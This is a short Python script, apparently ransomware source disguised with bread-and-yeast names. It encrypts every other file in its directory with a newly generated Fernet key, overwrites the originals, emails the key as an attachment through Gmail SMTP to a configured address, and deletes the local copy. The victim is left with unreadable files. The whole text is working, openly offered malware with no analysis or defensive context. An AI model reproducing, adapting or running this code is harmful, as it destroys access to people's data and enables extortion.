import os
import time
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

files = []

def send_email_with_attachment(sender_email, receiver_email, subject, body, attachment_path, smtp_server, smtp_port, sender_password):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # E-mail body
    msg.attach(MIMEText(body, 'plain'))

    # Opening the archive
    attachment = open(attachment_path, "rb")

    # Setting MIMEBase and the attachment
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= old_yeast.key")

    msg.attach(part)

    # Connecting the smtp server and sending the email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)
    text = msg.as_string()
    server.sendmail(sender_email, receiver_email, text)
    server.quit()

for file in os.listdir():
    if file == "corintios5-7.py" or file == "old_yeast.key" or file == "corintios5-8.py":
        continue
    if os.path.isfile(file):
        files.append(file)

old_yeast = Fernet.generate_key()

with open("old_yeast.key", "wb") as dough:
    dough.write(old_yeast)

for file in files:
    with open(file, "rb") as bread:
        attachment_path = os.getcwd() + "\old_yeast.key"
        contents = bread.read()
    contents_encrypted = Fernet(old_yeast).encrypt(contents)
    with open(file, "wb") as bread:
        bread.write(contents_encrypted)     

sender_email = "" #set your email and the receiver email, you can set yourself as receiver
receiver_email = ""
subject = "corintios key"
body = str(time.gmtime())
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_password = "" #set your gmail app password

send_email_with_attachment(sender_email, receiver_email, subject, body, attachment_path, smtp_server, smtp_port, sender_password)

os.remove(attachment_path)
